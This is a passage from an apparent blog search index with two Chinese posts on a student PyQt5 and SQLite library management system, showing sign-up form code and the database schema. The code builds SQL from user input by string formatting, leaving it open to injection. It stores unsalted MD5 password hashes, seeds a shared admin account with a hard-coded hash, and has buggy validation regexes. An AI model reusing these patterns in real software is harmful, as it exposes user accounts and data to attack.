self.passwordLineEdit.setFixedHeight(32)</span><br><span class="line">        self.passwordLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.passwordLineEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordLineEdit.setMaxLength(16)</span><br><span class="line">        self.formlayout.addRow(self.passwordLabel, self.passwordLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row4</span><br><span class="line">        self.passwordConfirmLabel &#x3D; QLabel(&quot;确认密码: &quot;)</span><br><span class="line">        self.passwordConfirmLabel.setFont(font)</span><br><span class="line">        self.passwordConfirmLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordConfirmLineEdit.setFixedWidth(180)</span><br><span class="line">        self.passwordConfirmLineEdit.setFixedHeight(32)</span><br><span class="line">        self.passwordConfirmLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.passwordConfirmLineEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordConfirmLineEdit.setMaxLength(16)</span><br><span class="line">        self.formlayout.addRow(self.passwordConfirmLabel, self.passwordConfirmLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row5</span><br><span class="line">        self.signUpbutton &#x3D; QPushButton(&quot;注 册&quot;)</span><br><span class="line">        self.signUpbutton.setFixedWidth(120)</span><br><span class="line">        self.signUpbutton.setFixedHeight(30)</span><br><span class="line">        self.signUpbutton.setFont(font)</span><br><span class="line">        self.formlayout.addRow(&quot;&quot;, self.signUpbutton)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(self.formlayout)</span><br><span class="line">        widget.setFixedHeight(250)</span><br><span class="line">        widget.setFixedWidth(300)</span><br><span class="line">        self.Hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout.addWidget(widget, Qt.AlignCenter)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(self.Hlayout)</span><br><span class="line">        self.layout.addWidget(widget, Qt.AlignHCenter)</span><br><span class="line"></span><br><span class="line">        # 设置验证</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.studentIdLineEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.passwordLineEdit.setValidator(pValidator)</span><br><span class="line">        self.passwordConfirmLineEdit.setValidator(pValidator)</span><br><span class="line">        self.signUpbutton.clicked.connect(self.SignUp)</span><br><span class="line">        self.studentIdLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.studentNameLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.passwordLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.passwordConfirmLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line"></span><br><span class="line">    def SignUp(self):</span><br><span class="line">        studentId &#x3D; self.studentIdLineEdit.text()</span><br><span class="line">        studentName &#x3D; self.studentNameLineEdit.text()</span><br><span class="line">        password &#x3D; self.passwordLineEdit.text()</span><br><span class="line">        confirmPassword &#x3D; self.passwordConfirmLineEdit.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or studentName &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot; or confirmPassword &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;表单不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        else:  # 需要处理逻辑，1.账号已存在;2.密码不匹配;3.插入user表</span><br><span class="line">            db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">            db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">            db.open()</span><br><span class="line">            query &#x3D; QSqlQuery()</span><br><span class="line">            if (confirmPassword !&#x3D; password):</span><br><span class="line">                print(QMessageBox.warning(self, &quot;警告&quot;, &quot;两次输入密码不一致，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                return</span><br><span class="line">            elif (confirmPassword &#x3D;&#x3D; password):</span><br><span class="line">                # md5编码</span><br><span class="line">                hl &#x3D; hashlib.md5()</span><br><span class="line">                hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">                md5password &#x3D; hl.hexdigest()</span><br><span class="line">                sql &#x3D; &quot;SELECT * FROM user WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (studentId)</span><br><span class="line">                query.exec_(sql)</span><br><span class="line">                if (query.next()):</span><br><span class="line">                    print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该账号已存在,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                    return</span><br><span class="line">                else:</span><br><span class="line">                    sql &#x3D; &quot;INSERT INTO user VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,0,0,0)&quot; % (</span><br><span class="line">                        studentId, studentName, md5password)</span><br><span class="line">                    db.exec_(sql)</span><br><span class="line">                    db.commit()</span><br><span class="line">                    print(QMessageBox.information(self, &quot;提醒&quot;, &quot;您已成功注册账号!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                    self.student_signup_signal.emit(studentId)</span><br><span class="line">                db.close()</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; SignUpWidget()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><ul><li>setUpUI用来初始化UI界面</li><li>signUp实现在注册过程中的逻辑以及对数据库的操作，按理说应该把数据库操作单独写一个模块的，不过我很懒…</li><li>注册成功暂时只是把数据插入了数据库，本来应该加上跳转页面之类的操作</li><li>如果觉得黑色的效果很好看的话，大家也可以调用经典的QSSstyle表qdarkstyle<br>##实现效果<br><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gdb895cqldj30p40hj0t5.jpg" alt="Alt text"></li></ul><p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gdb896b8o1j30p40hj0t5.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（1）——数据库</title>
    <url>/51f03b47.html</url>
    <content><![CDATA[<p>PS:由于CSDN太多广告所以弃用了，搬运到了自己的博客</p><h2><span id="pxie-zai-qian-mian">写在前面</span><a href="#pxie-zai-qian-mian" class="header-anchor">#</a></h2><p>这学期的数据库大作业要求是做一个简单的图书馆管理系统，刚好之前看过Qt，就打算用Qt来写了，博客记录一些重要的模块和思路</p><h2><span id="pyao-qiu">要求</span><a href="#pyao-qiu" class="header-anchor">#</a></h2><p>编写一个图书管理系统，要求具有以下内容：</p><ul><li>存储图书信息、采购和淘汰情况、租借情况</li><li>实现图书采购、淘汰、租借功能。</li><li>实现图书信息、采购和淘汰、库存、和租借情况查询</li><li>实现图书的采购、库存、淘汰、租借情况等统计</li></ul><p>这是要实现的基本功能，当然我觉得做好的话还可以加上读者推荐书目，我喜欢，收藏书目之类的功能</p><a id="more"></a><h2><span id="pda-zhi-si-lu">大致思路</span><a href="#pda-zhi-si-lu" class="header-anchor">#</a></h2><p>作为一个管理系统，自然要实现管理员和学生两个方面的内容</p><ul><li>首先需要登录和注册页面</li><li>对于管理员，在管理员的管理页面上，会实现图书的采购，淘汰，库存，租借情况查询及统计</li><li>对于学生，要实现图书的借阅、归还、租借情况查询</li></ul><h2><span id="pshu-ju-ku">数据库</span><a href="#pshu-ju-ku" class="header-anchor">#</a></h2><p>使用Sqlite3轻量级数据库作为系统的数据库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE User (</span><br><span class="line">  StudentId     CHAR(10) UNIQUE NOT NULL,</span><br><span class="line">  Name          VARCHAR(20),</span><br><span class="line">  Password      CHAR(32)        NOT NULL,</span><br><span class="line">  IsAdmin       BIT DEFAULT 0,</span><br><span class="line">  TimesBorrowed INT DEFAULT 0,</span><br><span class="line">  NumBorrowed   INT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE Book (</span><br><span class="line">  BookName     VARCHAR(30) NOT NULL,</span><br><span class="line">  BookId       CHAR(6)     NOT NULL,</span><br><span class="line">  Auth         VARCHAR(20) NOT NULL,</span><br><span class="line">  Category     VARCHAR(10) DEFAULT NULL,</span><br><span class="line">  Publisher    VARCHAR(30) DEFAULT NULL,</span><br><span class="line">  PublishTime  DATE,</span><br><span class="line">  NumStorage   INT         DEFAULT 0,</span><br><span class="line">  NumCanBorrow INT         DEFAULT 0,</span><br><span class="line">  NumBorrowed  INT         DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE User_Book (</span><br><span class="line">  StudentId   CHAR(10) UNIQUE NOT NULL,</span><br><span class="line">  BookId      CHAR(6)         NOT NULL,</span><br><span class="line">  BorrowTime  DATE,</span><br><span class="line">  ReturnTime  DATE,</span><br><span class="line">  BorrowState BIT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE BuyOrDrop (</span><br><span class="line">  BookId    CHAR(6) NOT NULL,</span><br><span class="line">  Time      DATE,</span><br><span class="line">  BuyOrDrop BIT DEFAULT 0,</span><br><span class="line">  Number    INT DEFAULT 0</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">INSERT INTO User VALUES (&#39;0000000000&#39;, &#39;管理员&#39;, &#39;f9687b82c237c8868a92ffa548c0a16a&#39;, 1, 0, 0);</span><br></pre></td></tr></table></figure><blockquote><p>所有管理员使用同一账户 ，password使用md5加密</p></blockquote><h3><span id="puser-biao">User表</span><a href="#puser-biao" class="header-anchor">#</a></h3><ul><li>StudentId：学号</li><li>Name：姓名</li><li>Password：密码</li><li>IsAdmin：是否为管理员</li><li>TimesBorrowed：借阅次数</li><li>NumBorrowed：已借书数量<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7q1ougaj30zc02l74i.jpg" alt="Alt text"></li></ul><h3><span id="pbook-biao">Book表</span><a href="#pbook-biao" class="header-anchor">#</a></h3><ul><li>BookName：书名</li><li>BookId：书号</li><li>Auth：作者</li><li>CateGory：分类</li><li>Publisher：出版社</li><li>PublishTime：出版时间</li><li>NumStorage：库存量</li><li>NumCanBorrowed：可借量</li><li>NumBorrowed：被借阅次数</li></ul><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7ri0ls0j313901zdg9.jpg" alt="Alt text"></p><h3><span id="puser-book-biao">User_Book表</span><a href="#puser-book-biao" class="header-anchor">#</a></h3><p>分别为学号，书号，借阅时间，归还时间，借阅状态</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7rnz07cj30o902o74g.jpg" alt="Alt text"></p><h3><span id="pbuyordrop-biao">BuyOrDrop表</span><a href="#pbuyordrop-biao" class="header-anchor">#</a></h3><p>分别为书号，添加或淘汰时间，添加还是淘汰，数量<br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb7q2jlagj30hn03jt8r.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
